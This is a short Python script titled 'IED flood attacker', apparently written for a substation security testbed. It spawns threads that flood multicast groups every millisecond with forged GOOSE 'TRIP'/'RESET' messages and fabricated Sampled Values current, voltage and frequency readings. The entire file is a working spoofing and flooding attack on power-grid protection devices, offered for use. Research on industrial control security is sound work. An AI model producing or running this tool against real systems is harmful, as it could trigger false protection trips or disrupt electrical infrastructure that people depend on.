"""
IED flood attacker

Author: Zein Ali
Date: 01/07/2025
"""

import socket
import json
import time
import random
import threading

GOOSE = "224.1.1.1"
SV = "239.192.0.1"
PORT = {"goose": 10200, "sv": 10010}

TARGETS = {
    "ied": PORT, "ied2": PORT, "p_ied1": PORT, "p_ied2": PORT
}

def select_target():
    print("Available IEDs:")
    for name in TARGETS:
        print(f" - {name}")
    while True:
        choice = input("Target IED: ").strip().lower()
        if choice in TARGETS:
            return choice

def goose_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    while True:
        m = {
            "goID": "GOOSE1",
            "status": random.choice(["TRIP", "RESET"]),
            "reason": "GOOSE flood",
            "stNum": random.randint(1, 9999),
            "sqNum": random.randint(1, 9999),
            "timestamp": time.time(),
            "checksum": 0,
            "role": "ATTACKER"
        }
        s.sendto(json.dumps(m).encode(), (GOOSE, PORT["goose"]))
        time.sleep(0.001)

def sv_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    i = 0
    while True:
        msg = {
            "svID": "MU1-SV",
            "datSet": "MeasMU1",
            "vlan": 0,
            "priority": 4,
            "utc_timestamp": time.time(),
            "sampleCount": i,
            "freq": random.uniform(45, 55),
            "Ia": random.uniform(-5000, 5000),
            "Ib": random.uniform(-5000, 5000),
            "Ic": random.uniform(-5000, 5000),
            "Ua": random.uniform(-10000, 10000),
            "Ub": random.uniform(-10000, 10000),
            "Uc": random.uniform(-10000, 10000)
        }
        s.sendto(json.dumps(msg).encode(), (SV, PORT["sv"]))
        i += 1
        time.sleep(0.001)

def run():
    target = select_target()
    print(f"Attacking {target.upper()}...")

    threading.Thread(target=goose_flood, daemon=True).start()
    threading.Thread(target=sv_flood, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    run()
